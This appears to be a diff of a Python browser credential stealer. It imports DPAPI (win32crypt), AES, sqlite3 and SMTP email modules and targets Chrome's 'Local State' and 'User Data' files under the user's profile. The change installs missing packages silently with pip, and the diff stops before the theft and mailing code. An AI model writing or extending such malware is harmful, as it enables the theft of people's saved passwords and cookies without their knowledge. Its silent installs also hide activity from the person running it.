@@ -1,20 +1,12 @@
 #!/usr/bin/enc python3 
 
 import os
-while True:
-    try:
-        os.system("pip install pycryptodomex")
-        os.system("pip install pypiwin32")
-        break
-    except:
-        pass
 import re
+import subprocess
 import sys
 import json
 import base64
 import sqlite3
-import win32crypt
-from Cryptodome.Cipher import AES
 import shutil
 import csv
 import smtplib
@@ -22,6 +14,21 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
 from email import encoders
+
+def install(package):
+    subprocess.check_call([sys.executable , '-m' , 'pip','install',package] ,stdout=subprocess.DEVNULL , stderr=subprocess.DEVNULL)
+
+try:
+    import win32crypt
+except ImportError:
+    install('pypiwin32')
+    import win32crypt
+
+try:
+    from Cryptodome.Cipher import AES
+except ImportError:
+    install('Cryptography')
+    from Cryptodome.Cipher import AES
 
 Browser_list = [
     os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])) , os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE'])) ,
